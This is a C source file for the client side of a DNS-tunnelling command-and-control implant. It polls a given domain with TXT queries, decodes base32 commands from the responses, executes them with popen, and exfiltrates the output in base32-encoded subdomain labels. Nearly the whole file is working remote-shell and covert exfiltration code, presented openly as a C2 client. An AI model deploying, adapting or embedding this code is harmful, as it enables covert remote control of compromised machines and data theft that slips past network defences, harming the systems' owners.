#include "base32.c"
#include <arpa/inet.h>
#include <netinet/in.h>
#include <resolv.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/* configurable */
#define PORT_NUMBER (41198)                   /* sending port */
#define DATA_PART_LENGTH (3 * SUBDOMAIN_SIZE) /* bytes of data in domain */
#define DEAD_SERVER_HELLO_INTERVAL_IN_SEC 60  /* server doesn't respond */
#define ALIVE_SERVER_HELLO_INTERVAL_IN_SEC 5  /* server responds */

/* const */
#define TXT (16)
#define HELLO_ID (65535)
#define SUBDOMAIN_SIZE (63)
#define END_OF_TRANSMISSION_ID (65534)
#define DNS_REQUEST_SIZE(data_size) (sizeof(struct dns_header) + data_size + 4)

/* representation of DNS query header */
struct dns_header {
  uint16_t id;
  uint16_t flags;
  uint16_t qdcount;
  uint16_t ancount;
  uint16_t nscount;
  uint16_t arcount;
};

/*
 * Converts string representation of domain ("your.domain.com") to DNS standard
 * byte representation (4your6domain3com0).  The result is saved in memory
 * pointed by pointer given in arguments and the returned value is the size of
 * the result.
 */
int prepare_domain(const char *raw_domain, const int length, char *result) {
  int result_index = 0;
  int size = 0; /* size of domain label */

  for (int i = 0; i < length; i++) {
    if (raw_domain[i] == '.' || raw_domain[i] == 0x00) {
      memset(result + result_index++, (uint8_t)size, sizeof(uint8_t));
      memcpy(result + result_index, raw_domain + i - size, size);
      result_index += size;
      size = 0;
    } else
      size++;
  }
  return ++result_index;
}

/*
 * Prepares DNS query with a given type (A / TXT), query id, domain name and
 * saves the result in memory pointed by pointer given in arguments.
 */
void generate_dns_request(const uint16_t type, const char *data_as_domain,
                          const int data_size, char *request) {
  struct dns_header header;
  uint16_t query_type = htons(type);
  uint16_t query_class = htons(1);
  uint16_t id = rand() % 65536;

  header.id = htons(id);
  header.flags = htons(256);
  header.qdcount = htons(1);
  header.ancount = 0;
  header.nscount = 0;
  header.arcount = 0;
  memcpy(request, &header, sizeof(header));
  memcpy(request + sizeof(header), data_as_domain, data_size);
  memcpy(request + sizeof(header) + data_size, &query_type, sizeof(query_type));
  memcpy(request + sizeof(header) + data_size + sizeof(query_type),
         &query_class, sizeof(query_class));
}

/*
 * Reads DNS response and saves sent value in memory pointed by pointer given in
 * arguments. If an error is returned by the server then the function waits for
 * DEAD_SERVER_HELLO_INTERVAL_IN_SEC and returns 1.
 */
int get_data_from_dns_response(const char *dns_response, char *result) {
  struct dns_header header = {0};
  const int REPLY_CODE_MASK = 3840;
  uint16_t index = 0;
  uint16_t type;
  uint16_t data_length;

  /* header */
  memcpy(&header, dns_response, sizeof(struct dns_header));
  index += sizeof(struct dns_header);
  if ((uint16_t)(header.flags & REPLY_CODE_MASK) !=
      htons(0)) { /* reply code for: No error */
    printf("Server doesn't respond!\nSleeping for %d seconds\n",
           DEAD_SERVER_HELLO_INTERVAL_IN_SEC);
    sleep(DEAD_SERVER_HELLO_INTERVAL_IN_SEC);
    return 1;
  }

  /* query body */
  while (dns_response[index++] != 0x00) {
    ;
  }
  memcpy(&type, dns_response + index, sizeof(type));
  index += 14; /* QUERY: type(2), class(2)  RESPONSE: compressed name(2),
                 type(2), class(2), ttl(4) */

  /* response body */
  memcpy(&data_length, dns_response + index, sizeof(data_length));
  index += sizeof(data_length);
  data_length = htons(data_length);
  if (htons(type) == TXT) { /* if type TXT skip txt_length field */
    index++;
    data_length--;
  }
  memcpy(result, dns_response + index, data_length);
  return 0;
}

/*
 * Transforms outgoing data, message id and client id to subdomains (all base32
 * encoded).
 * Simplified result representation:
 *    data.data.data.info_block.domain (dots are replaced with label size)
 *    info_block is built from 5 bytes encoded to base32 (resulting in 8 bytes)
 *    info_block: (2B) junk + (1B) client_id + (2B) msg_id
 * Junk is randomized for each request and is used for preventing
 * usage of cached DNS repsonses. Returned value is a pointer to the result.
 */
char *transform_data_to_domain_name(const char *data, const uint64_t data_size,
                                    const uint16_t msg_id,
                                    const uint8_t client_id, const char *domain,
                                    const int domain_size) {
  char id_plain[5];
  char id_base32[8];
  char *result = malloc(256);
  uint8_t subdomains_count = 0;
  uint16_t msg_junk = rand() % 65536; /* generating 2 bytes of junk */
  uint64_t index = 0;

  memset(result, 0, 256);
  memset(id_plain, msg_junk, sizeof(uint16_t));
  memset(id_plain + 2, client_id, sizeof(uint8_t));
  memcpy(id_plain + 3, &msg_id, sizeof(uint16_t));
  base32_encode((unsigned char *)id_plain, 5, (unsigned char *)id_base32);

  /* splitting data into subdomains */
  while (index < data_size) {
    if (data_size - index >= SUBDOMAIN_SIZE) {
      memset(result + index + subdomains_count, (uint8_t)SUBDOMAIN_SIZE,
             sizeof(uint8_t));
      memcpy(result + index + subdomains_count + sizeof(uint8_t), data + index,
             SUBDOMAIN_SIZE);
      index += SUBDOMAIN_SIZE;
    } else {
      memset(result + index + subdomains_count, (uint8_t)(data_size - index),
             sizeof(uint8_t));
      memcpy(result + index + subdomains_count + sizeof(uint8_t), data + index,
             data_size - index);
      index = data_size;
    }
    subdomains_count++;
  }

  memset(result + index + subdomains_count, (uint8_t)sizeof(id_base32),
         sizeof(uint8_t));
  memcpy(result + index + subdomains_count + sizeof(uint8_t), id_base32,
         sizeof id_base32);
  memcpy(result + index + subdomains_count + sizeof(uint8_t) +
             sizeof(id_base32),
         domain, domain_size);
  return result;
}

/*
 * Prepares and sends single DNS query containing given data.
 * Data must fit in domain name size limits!
 */
void send_request(const int type, const uint16_t msg_id,
                  const uint8_t client_id, const char *data,
                  const uint64_t data_size, const char *domain_name,
                  const int domain_name_size, const int network_socket,
                  const struct sockaddr_in dns_server_address) {
  char data_as_domain_name[256];
  char request[512];

  memcpy(data_as_domain_name,
         transform_data_to_domain_name(data, data_size, ntohs(msg_id),
                                       client_id, domain_name,
                                       domain_name_size),
         256);
  generate_dns_request(type, data_as_domain_name,
                       strlen(data_as_domain_name) + 1, request);
  sendto(network_socket, (const char *)request,
         DNS_REQUEST_SIZE(strlen(data_as_domain_name) + 1), 0,
         (const struct sockaddr *)&dns_server_address,
         sizeof(dns_server_address));
}

/*
 * Splits data into sizes allowed for a domain name and sends multiple queries
 * with proper message id. After all data is sent, a query with a specified id
 * is sent to signal the end of transmission. After each query, the function
 * waits for 5s for acknowledgment from the server and if it doesn't come then
 * sending is canceled. The returned value indicates if sending was successful
 * (0) or not (1).
 */
int send_data(const char *data, const uint64_t dataSize,
              const uint8_t client_id, const char *domain_name,
              const int domain_name_size, const int network_socket,
              const struct sockaddr_in dns_server_address) {
  uint64_t index = 0;
  uint16_t msg_id = 1;
  char *dummy_dns_desponse = malloc(512);

  while (index + DATA_PART_LENGTH < dataSize) {
    send_request(TXT, msg_id, client_id, data + index, DATA_PART_LENGTH,
                 domain_name, domain_name_size, network_socket,
                 dns_server_address);
    if (recvfrom(network_socket, dummy_dns_desponse, 512, MSG_WAITALL, NULL,
                 NULL) < 0) {
      printf("No ACK from the server! Canceling sending ...\n");
      return 1;
    }
    index += DATA_PART_LENGTH;
    msg_id++;
  }

  send_request(TXT, msg_id, client_id, data + index, dataSize - index,
               domain_name, domain_name_size, network_socket,
               dns_server_address);
  if (recvfrom(network_socket, dummy_dns_desponse, 512, MSG_WAITALL, NULL,
               NULL) < 0) {
    printf("No ACK from the server! Canceling sending ...\n");
    return 1;
  }

  /* end of transmission */
  send_request(TXT, (uint16_t)END_OF_TRANSMISSION_ID, client_id, "", 0,
               domain_name, domain_name_size, network_socket,
               dns_server_address);
  if (recvfrom(network_socket, dummy_dns_desponse, 512, MSG_WAITALL, NULL,
               NULL) < 0) {
    printf("No ACK from the server! Canceling sending ...\n");
    return 1;
  }
  return 0;
}

/*
 * Takes base32 encoded command, decodes it, and executes. The result is then
 * encoded back to base32 and saved to the memory pointed by the pointer given
 * in arguments. There is a limit of 1035 characters in a single line of
 * command's result.
 */
void execute_command(const char *command, const int command_size,
                     char *encoded_result, const int result_max_size) {
  FILE *cmd;
  int index = 0;
  char line_of_result[1035];
  char decoded_command[UNBASE32_LEN(command_size)];
  char *command_result = malloc(UNBASE32_LEN(result_max_size));

  base32_decode((unsigned char *)command, (unsigned char *)decoded_command);
  printf("%s\n", decoded_command);
  cmd = popen(decoded_command, "r");

  if (cmd == NULL) {
    printf("Failed to run command\n");
    return;
  }

  while (fgets(line_of_result, sizeof(line_of_result), cmd) != NULL) {
    memcpy(command_result + index, line_of_result, strlen(line_of_result));
    index += strlen(line_of_result);
  }

  base32_encode((unsigned char *)command_result, strlen(command_result),
                (unsigned char *)encoded_result);
  pclose(cmd);
}

/*
 * Establishes a connection with the C2 server. Creates socket, picks random
 * (0-255) id for this client, reads default DNS resolver from system config,
 * and starts polling by sending queries with hello id. If the server responds,
 * but with empty command (operator hasn't typed it yet), the function waits for
 * ALIVE_SERVER_HELLO_INTERVAL_IN_SEC and sends another hello query. If a
 * command is present in the response, sends it to execution, gets the result
 * and sends it to the server.
 */
void start_communication(const char *domain_name, const int domain_name_size,
                         const uint8_t client_id) {
  struct sockaddr_in client_address;
  struct sockaddr_in dns_server_address;
  char command[128];
  char dns_response[512];
  char data_to_send[2097152];
  int net_socket = -1;

  struct timeval tv;
  tv.tv_sec = 5;
  tv.tv_usec = 0;

  client_address.sin_family = AF_INET;
  client_address.sin_addr.s_addr = INADDR_ANY;
  client_address.sin_port = htons(PORT_NUMBER);

  if (res_init() == 0) {
    dns_server_address = _res.nsaddr_list[0];
  } else {
    printf("Couldn't read dns resolver config!\n");
    exit(1);
  }

  net_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (net_socket == -1) {
    perror("Failed to create socket!");
    exit(1);
  }

  if (bind(net_socket, (const struct sockaddr *)&client_address,
           sizeof(client_address)) == -1) {
    printf("Socket binding error!");
    close(net_socket);
    exit(1);
  }

  if (setsockopt(net_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
    printf("Socket timeout config error!");
  }

  while (1) {
    memset(command, 0, sizeof(command));
    memset(dns_response, 0, sizeof(dns_response));
    memset(data_to_send, 0, sizeof(data_to_send));

    send_request(TXT, (uint16_t)HELLO_ID, client_id, "", 0, domain_name,
                 domain_name_size, net_socket, dns_server_address);
    printf("Hello packet sent\n");

    if (recvfrom(net_socket, (char *)dns_response, 512, MSG_WAITALL, NULL,
                 NULL) < 0) {
      printf("Timeout!\n");
    } else {
      /* Valid DNS response and TXT record has a base32 data */
      if (get_data_from_dns_response(dns_response, command) == 0) {
        if (strlen(command) > 7) {
          printf("Received response with command: ");
          execute_command(command, strlen(command), data_to_send,
                          sizeof(data_to_send));
          printf("Sending command result ...\n");
          send_data(data_to_send, strlen(data_to_send), client_id, domain_name,
                    domain_name_size, net_socket, dns_server_address);
          printf("Data sent!\n");
        } else {
          printf("Received empty response\n");
        }
        sleep(ALIVE_SERVER_HELLO_INTERVAL_IN_SEC);
      }
      printf("--------------------------------\n");
    }
  }
}

int main(int argc, char *argv[]) {
  char *domain_name = malloc(300);
  int domain_name_size;
  uint8_t client_id;
  time_t tt;
  int seed = time(&tt);
  srand(seed);

  if (argc < 2) {
    printf(
        "Provide domain name! ./client a.example.com client_id [optional]\n");
    return 1;
  } else if (argc == 2) { /* client_id not provided in arguments */
    client_id = rand() % 256;
    domain_name_size =
        prepare_domain(argv[1], strlen(argv[1]) + 1, domain_name);
    start_communication(domain_name, domain_name_size, client_id);
  } else { /* client_id provided in arguments */
    client_id = atoi(argv[2]);
    domain_name_size =
        prepare_domain(argv[1], strlen(argv[1]) + 1, domain_name);
    start_communication(domain_name, domain_name_size, client_id);
  }
  return 0;
}